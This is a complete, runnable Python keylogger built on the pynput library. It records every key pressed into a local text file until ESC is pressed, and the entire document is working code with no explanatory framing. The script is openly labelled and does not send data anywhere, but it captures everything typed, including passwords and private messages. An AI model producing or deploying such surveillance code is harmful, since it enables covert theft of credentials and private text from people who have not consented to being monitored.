from pynput.keyboard import Listener, Key

# File to store logged keys
log_file = "key_log.txt"

def on_press(key):
    # Stop the keylogger if ESC is pressed
    if key == Key.esc:
        print("ESC key pressed. Stopping the keylogger...")
        return False  # Returning False stops the listener

    # Log the key pressed
    with open(log_file, "a") as file:
        try:
            # Log the key if it is a character
            file.write(f"{key.char}")
        except AttributeError:
            # Handle special keys (e.g., space, enter, etc.)
            file.write(f" {str(key)} ")

def main():
    print("Keylogger started... (Press ESC to stop)")

    # Start the listener to capture keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
